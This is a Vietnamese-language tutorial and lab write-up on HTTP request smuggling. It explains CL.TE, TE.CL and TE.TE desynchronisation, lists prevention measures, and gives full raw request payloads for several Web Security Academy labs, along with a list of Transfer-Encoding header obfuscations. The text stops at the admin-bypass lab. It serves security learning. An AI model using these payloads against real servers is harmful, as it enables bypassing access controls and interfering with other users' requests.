# HTTP Request Smuggling

## What is HTTP Request Smuggling ?

HTTP request smuggling (HRS) là 1 kỹ thuật tấn công nhằm vào các HTTP server(web server, proxy server).
Bất cứ khi nào 1 HTTP requset của client được phân tích bởi nhiều hơn 1 hệ thống thì đều có khả năng bị 
HRS. HRS thường rất nghiêm trọng, cho phép kẻ tấn công vượt qua các kiểm soát bảo mật, truy cập trái phép vào dữ liệu nhảy cảm và xâm phạm vào ứng dụng.


HRS có các hướng khai thác sau: 
  
  + khai thác một web cache server được triển khai giữa client và web server
  
  + Bypass hệ thống firewall của web server
  
  + Khai thác một web proxy server được triển khai giữa client và web server.

Để tiến hành HRS, không nhất thiết ứng dụng web phải có lỗ hổng (chẳng hạn SQL Injection, XSS,...), thay vào đó, chỉ cần một sự khác nhau nhỏ trong cách xử lý các HTTP request không hợp lệ của các HTTP server. Hacker sẽ gửi đi những HTTP request không hợp lệ để xem phản ứng của hai hệ thống, từ đó, tìm cách bypass filter của các hệ thống này.

### HTTP request smuggling attack

Khi máy chủ front-end chuyển tiếp các yêu cầu HTTP đến một máy chủ back-end, nó thường gửi một số request qua cùng một kết nối mạng back-end, vì điều này hiệu quả và hiệu quả hơn nhiều. Giao thức rất đơn giản: Các HTTP request được gửi lần lượt và máy chủ nhận phân tích cú pháp các HTTP request headers để xác định nơi một yêu cầu kết thúc và yêu cầu tiếp theo bắt đầu:

Trong tình hướng này, điều quan trọng là hệ thống front-end và back-end phải đồng ý về ranh giới giữa các yêu cầu. Nếu không, kẻ tấn công có thể gửi một yêu cầu không rõ ràng được hệ thống front-end và back-end diễn giải khác nhau:

hacker khiến 1 phần của front-end request của chúng được máy chủ back-end hiểu là phần bắt đầu của phần tiếp theo. Nó được thêm vào trước 1 cách hiệu quả cho request tiếp theo và do đó có thể ảnh hướng đến cách ứng dụng xử lý request đó

## Prevent HTTP request smuggling


HTTP request smuggling phát sinh trong các tình huống trong đó server front-end chuyển tiếp nhiều yêu cầu đến server back-end qua cùng một kết nối mạng và giao thức được sử dụng cho các kết nối back-end có nguy cơ hai máy chủ không thống nhất về ranh giới giữa các request. Một số cách chung để ngăn chặn phát sinh các lỗ hổng bắt lậu yêu cầu HTTP như sau:

  + Không sử dụng lại các kết nối back-end để mỗi yêu cầu back-end được gửi qua một kết nối mạng riêng biệt.
  + Sử dụng HTTP / 2 cho các kết nối back-end, vì giao thức này ngăn chặn sự mơ hồ về ranh giới giữa các request.
  + Thống nhất phần mềm giữa server back-end và front-end, thống nhất tiêu chuẩn giữa các yêu cầu.


## Exploiting HTTP request smuggling vulnerabilities

- Using HTTP request smuggling to bypass front-end security controls: web front-end server được sử dụng để triển khai một số kiểm soát bảo mật, quyết định xem có cho phép xử lý các yêu cầu riêng lẻ hay không. Các yêu cầu được phép được chuyển tiếp đến server back-end, nơi chúng được coi là đã bypass các điều khiển front-end.

- Revealing front-end request rewriting: máy chủ front-end thực hiện một số việc viết lại các yêu cầu trước khi chúng được chuyển tiếp đến máy chủ back-end, thường bằng cách thêm một số tiêu đề yêu cầu bổ sung.

- Capturing other users' requests : 

- Using HTTP request smuggling to exploit reflected XSS

- Using HTTP request smuggling to turn an on-site redirect into an open redirect

- Using HTTP request smuggling to perform web cache poisoning

- Using HTTP request smuggling to perform web cache poisoning



## HTTP request smuggling Lab

### Lab: HTTP request smuggling, basic CL.TE vulnerability
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```

Lab này liên quan đến server front-end và back-end và server front-end không hỗ trợ mã hóa phân đoạn (chunked encoding) . Server front-end từ chối các yêu cầu không sử dụng phương thức GET hoặc POST.

Để giải quyết bài lab, hãy chuyển một request đến server back-end để yêu cầu tiếp theo được xử lý bởi server back-end dường như sử dụng phương thức GPOST.



Truy cập bài lab chúng ta thấy 1 blog như sau, bắt lại request để phân tích.


Đề bài đã nhắc tới phương thức GPOST tuy nhiên chúng ta lại biết đến phương thức GET (request) đang dùng và POST. Điều này làm chúng ta cần 1 phương pháp để thực hiện được phương thức GPOST.

#### CL.TE vulnerabilities
Server front-end sử dụng Transfer-Encoding header và server back-end sử dụng Content-Length header. Chúng tôi có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end server xác định được Content-lenght là nội dung của request dài 13 bytes, kết thức bằng từ SMUGGLED và gửi nó đến server back-end.

Server back-end xử lý Tranfer-Encoding header và do đó xử lý nội dung thư như sử dụng mã hóa phân đoạn(chunked encoding) . Nó xử lý đoạn đầu tiên, được cho biết là có độ dài bằng 0, và như vậy được coi là kết thúc request. Các byte sau, cụ thể là từ SMUGGLED, không được xử lý và server back-end sẽ coi chúng là phần bắt đầu của yêu cầu tiếp theo trong chuỗi. Từ đó chúng ta có thể lợi dụng kẽ hỡ này để gọi nên phước thức GPOST bằng cashc thay SMUGGLED bằng G .

Sau đó có payload như sau : 

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
Chuyển request qua repeater và send 2 lần và chúng ta được kết quả phương thức GPOST.


### Lab: HTTP request smuggling, basic TE.CL vulnerability
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
Đối với yêu cầu tương tự bài lab trên, tuy nhiên lỗ hổng khai thác lại là loại khác đầy là loại *TE.CL vulnerabilities*. Vậy bây giờ chúng ta tìm hiểu qua xem cách khai thác lỗ hổng này như thế nào nhé.


#### TE.CL vulnerabilities
Server front-end sử dụng Transfer-Encoding header và server back-end sử dụng Content-Length header. Chúng tôi có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
Server front-end xử lý Tranfer-Encoding header và do đó xử lý nội dung thư như sử dụng mã hóa phân đoạn. Nó xử lý đoạn đầu tiên, được cho là dài 8 byte, tính đến đầu dòng sau SMUGGLED. Tiếp đoạn thứ hai, được cho biết là có độ dài bằng 0, và như vậy được coi là kết thúc request . Request này được chuyển tiếp đến server back-end.

Server back-end xử lý tiêu đề Content-Length và xác định rằng nội dung request dài 3 byte, tính đến đầu dòng sau 8. Các byte sau, bắt đầu bằng SMUGGLED, không được xử lý và server back-end sẽ coi đây là sự khởi đầu của request tiếp theo trong chuỗi.


Đầu tiên chúng ta bắt request của blog sau đó chuyển đổi phương thức từ GET sang POST. Sau đó thay bằng đoạn payload sau.
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```


Tuy nhiên bạn phải tắt chế độ auto update Content length của Burp nếu không nó sẽ định dạng phân đoạn đầu tiên của chúng ta chính là toàn bộ request sau đó định dạng length và biến nó ở thành 1 request bình thường và sẽ không thể thực hiện exploit được nữa


Sau đó chúng ta thực hiện như bài lab trước và chúng ta đã hoàn thành được bài lab 



### Lab: HTTP request smuggling, obfuscating the TE header
```
This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
Mô tả cũng không có gì khác những bài lab trước tuy nhiên cách thức thực hiện thì lại khác nhau. Lần này chúng ta sẽ exploit theo 1 cách khác đó chính là *obfuscating the TE header*

#### TE.TE behavior: obfuscating the TE header

Có rất nhiều cách để làm xáo trộn Transfer-Encoding header. Ví dụ :
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
Từ đó chúng ta truy cập bài lab và bắt request sau đó exploit như bài trước thì chúng ta nhận thấy rằng không trả về kết quả mà chúng ta mong muốn. Đó là lí do tại sao bài lab lại muốn chúng ta áp dụng làm rối loạn TE header.

Thay thế Tranfer-Encoding bằng 1 trong những ví dụ có trên  và chúng ta có payload như sau : 


```

POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```






### Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

Bài lab này yêu cầu chúng ta chứng thực xem có lỗ hổng hay không bằng cách để nó phản hồi lại bằng 404 Not Found.

Đầu tiên, chúng ta có lý thuyết như sau : 

#### Confirming CL.TE vulnerabilities using differential responses
```
To confirm a CL.TE vulnerability, you would send an attack request like this:

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:

GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it.
```
Dựa trên như lý thuyết thì chúng ta phải gửi 1 đoạn payload như sau ; 
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Nếu xác định có lỗ hổng thì phản hồi tiếp theo sẽ có thêm những phân đoạn sau như:
```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

Điều này sẽ làm request không hợp lệ và sẽ trả về lỗi 404 Not Found.

Ta thực hiện tương tự các bài lab trước tuy nhiên sẽ thay đổi payload như trên .



Và kết quả trả về 404 Not Found và chúng ta đã hoàn thành bài lab.


### Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```
Đối với mô tả và lý thuyết thì tương tự bài trước tuy nhiên để khai thác lỗ hổng TE.CL thì lại phải dùng payload khác. Có ví dụ như sau :

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```
Yêu cầu trên chỉ đọc phân đoạn 4 bytes tức là từ GET trở xuống sẽ được đưa về request sau. Nếu có tồn tại lỗi thì request sau sẽ là : 
 ```
 GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
 ```

Tương tự như vậy chúng ta thử thay thế request như sau : 
      
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
 và làm tương tự như những bài lab trước.
 
 
 ### Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
 ```
 This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
 ```
Bài lab cơ bản vẫn như những bài trước, tuy nhiên lần này chúng ta có thêm bảng điều khiển là admin tuy nhiên server frond-end đã block lại. Điều kiện để chúng ta solve bài lab đó chính là dựa trên admin xóa user carlos.










